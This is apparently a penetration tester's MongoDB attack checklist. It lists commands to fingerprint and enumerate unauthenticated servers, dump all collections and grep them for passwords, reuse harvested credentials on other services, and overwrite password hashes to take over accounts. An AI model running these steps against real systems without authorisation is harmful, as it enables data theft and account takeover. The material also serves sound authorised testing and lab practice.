# MongoDB enumeration

## Version and databases
sudo nmap -sV -p 27017 --script mongodb-info,mongodb-databases <TargetIP>
- [ ] Databases listed with no login: no authentication at all
- [ ] The version through searchsploit mongodb

## Connect
mongosh mongodb://<TargetIP>:27017
mongosh --host <TargetIP> -u '<Username>' -p '<Password>' --authenticationDatabase admin
- [ ] Refused: the account may live in the application's database, --authenticationDatabase <Database>
- [ ] A very old server that mongosh refuses: the legacy mongo shell
One command straight from Kali:
mongosh mongodb://<TargetIP>:27017 --quiet --eval 'db.adminCommand({listDatabases: 1})'

## Look around
show dbs
use <Database>
show collections
db.getUsers()
db.getCollection('THE-COLLECTION').find().limit(20)
db.getCollection('THE-COLLECTION').countDocuments()
- [ ] Users, password hashes, API keys and tokens in the application's collections
- [ ] Every credential found tried on SSH, the web login and every other service
- [ ] admin, config and local are MongoDB's own: the rest are the application's

## Take everything
mongodump --host <TargetIP> --out mongo-dump
mongodump --host <TargetIP> -u '<Username>' -p '<Password>' --authenticationDatabase admin --out mongo-dump
bsondump mongo-dump/<Database>/THE-COLLECTION.bson
grep -rail 'pass' mongo-dump
- [ ] mongodump and bsondump come with the mongo tools package

## Write access
- [ ] Logged in as the application's account, its users collection may take a change: an admin user of my own, or my password hash on an existing one
db.getCollection('THE-COLLECTION').find({}, {username: 1, password: 1})
- [ ] The hash format matched to the application's, from an existing row, before writing one
db.getCollection('THE-COLLECTION').updateOne({username: 'THE-ACCOUNT'}, {$set: {password: 'THE-NEW-HASH'}})
